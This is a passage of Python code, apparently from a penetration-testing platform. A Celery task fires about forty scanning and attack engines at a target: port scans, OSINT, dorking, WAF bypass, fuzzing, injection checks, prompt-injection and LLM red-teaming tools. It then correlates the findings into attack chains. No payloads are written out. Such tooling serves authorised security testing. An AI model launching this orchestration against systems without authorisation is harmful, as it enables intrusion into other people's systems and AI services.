            return "Falha no parser Nmap."
        except Exception as e:
            return f"Erro Nmap: {e}"


@celery_app.task(name='scanner_tasks.run_full_scan')
def run_full_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"

        engines = [
            ("Naabu", run_naabu_portscan, [target, project_id]),
            ("Nmap", run_nmap_scan, [target, project_id]),
            ("Maryam", run_maryam_osint, [target, project_id]),
            ("Nuclei", run_nuclei_scan, [target, project_id]),
            ("Mr.Holmes", run_mrholmes_recon, [target, project_id]),
            ("E4GL30S1NT", run_e4gl30s1nt_osint, [target, project_id]),
            ("INURLBR", run_inurlbr_dorking, [target, project_id]),
            ("CaesarOSINT", run_caesarosint, [target, project_id]),
            ("RobotsAnalyzer", run_robots_analyzer, [target, project_id]),
            ("Supabomb", run_supabomb_scan, [target, project_id]),
            ("SPECTER", run_specter_scan, [target, project_id]),
            ("Wasminator", run_wasminator_scan, [target, project_id]),
            ("BadWorker", run_badworker_scan, [target, project_id]),
            ("PromptInjector", run_prompt_inject, [target, project_id]),
            ("CSRFDetector", run_csrf_scan, [target, project_id]),
            ("WAFBypass", run_wafbypass_scan, [target, project_id]),
            ("Ffuf", run_ffuf_fuzz, [f'https://{target}/FUZZ', project_id, 'directory']),
            ("Cascavel", run_cascavel_scan, [target, project_id]),
            ("Cascavel-Injection", run_cascavel_category, [target, project_id, "injection"]),
            ("Cascavel-Auth", run_cascavel_category, [target, project_id, "auth"]),
            ("Cascavel-API", run_cascavel_category, [target, project_id, "api"]),
            ("Cascavel-Infra", run_cascavel_category, [target, project_id, "infra"]),
            ("Cascavel-Recon", run_cascavel_category, [target, project_id, "recon"]),
            ("Cascavel-WebScan", run_cascavel_category, [target, project_id, "web_scan"]),
            ("PentestAI-Builtin", run_pentestai_scan, [target, project_id]),
            ("Garak", run_garak_scan, ["openai", "gpt-3.5-turbo", project_id]),
            ("Promptfoo", run_promptfoo_eval, [target, project_id]),
            ("HiddenLayer-LLM", run_hiddenlayer_monitor, [project_id, "llm", target]),
            ("Foolbox", run_foolbox_attack, [project_id]),
            ("CleverHans", run_cleverhans_benchmark, [project_id]),
            ("TFPrivacy", run_tfprivacy_audit, [project_id]),
            ("ART", run_art_scan, [project_id]),
            ("TorchAttacks", run_torchattacks_scan, [project_id]),
            ("TextAttack", run_textattack_scan, [project_id]),
            ("LLM-Attacks", run_llmattacks_scan, [target, project_id]),
            ("RuntimeHooks", run_runtimehooks_scan, [target, project_id]),
            ("PyRIT", run_pyrit_scan, [target, project_id]),
            ("LLMGuard", run_llmguard_scan, [target, project_id]),
            ("Rebuff", run_rebuff_scan, [project_id]),
            ("HarmBench", run_harmbench_eval, [project_id]),
            ("PromptBench", run_promptbench_eval, [project_id]),
        ]
        for name, task_fn, args in engines:
            print(f"[FullScan] Disparando {name}...")
            task_fn.delay(*args)

        engine_names = [e[0] for e in engines]
        print(f"[FullScan] {len(engines)} engines disparadas: {', '.join(engine_names)}")

        try:
            all_findings = Finding.query.filter_by(project_id=project_id).all()
            batch_data = [{"id": f.id, "title": f.title, "description": f.description, "plugin_source": f.plugin_source} for f in all_findings]
            chains = cross_correlate_all(project_id, batch_data)
            if chains:
                print(f"[FullScan] {len(chains)} cadeias de ataque identificadas via correlacao cruzada.")
        except Exception as e:
            print(f"[FullScan] Erro na correlacao cruzada: {e}")

        return f"Full scan concluido: {len(engines)} engines e correlacao cruzada."
